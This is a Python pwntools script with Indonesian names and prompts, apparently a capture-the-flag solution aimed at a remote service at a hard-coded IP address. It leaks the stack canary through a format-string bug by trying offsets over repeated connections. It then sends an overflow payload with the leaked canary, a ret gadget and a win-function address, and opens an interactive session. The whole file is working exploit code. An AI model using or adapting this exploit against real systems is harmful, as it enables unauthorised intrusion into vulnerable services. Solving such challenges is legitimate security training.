from pwn import *

context.clear(arch='amd64')

HOST = '54.151.244.93'
PORT = 9999
WIN  = 0x401216
PAD  = 72
RET_GADGET = 0x40101a  

def bocorkan_canary(offset):
    p = remote(HOST, PORT)
    p.recvuntil(b'nama lengkapmu: ')
    p.sendline(f'%{offset}$lx'.encode())
    p.recvuntil(b'Halo, ')
    val = p.recvline().strip()
    p.close()
    return val

def mirip_canary(val):
    return len(val) == 16 and val.endswith(b'00')

def cari_offset():
    for off in range(6, 40):
        val1 = bocorkan_canary(off)
        if not mirip_canary(val1):
            continue
        val2 = bocorkan_canary(off)
        if mirip_canary(val2) and val2 != val1:
            log.success(f'Offset canary TERKONFIRMASI: {off}')
            return off
    return None

def exploit(offset):
    p = remote(HOST, PORT)
    p.recvuntil(b'nama lengkapmu: ')
    p.sendline(f'%{offset}$lx'.encode())
    p.recvuntil(b'Halo, ')
    canary = int(p.recvline().strip(), 16)
    log.success(f'Canary bocor: {hex(canary)}')

    p.recvuntil(b'username ctfmu: ')
    payload = flat({
        0: b'A' * PAD,
        PAD: p64(canary),
        PAD + 8: b'B' * 8,
        PAD + 16: p64(RET_GADGET),  
        PAD + 24: p64(WIN),
    })
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    off = cari_offset()
    if off is None:
        log.error('Offset tidak ditemukan')
    else:
        exploit(off)
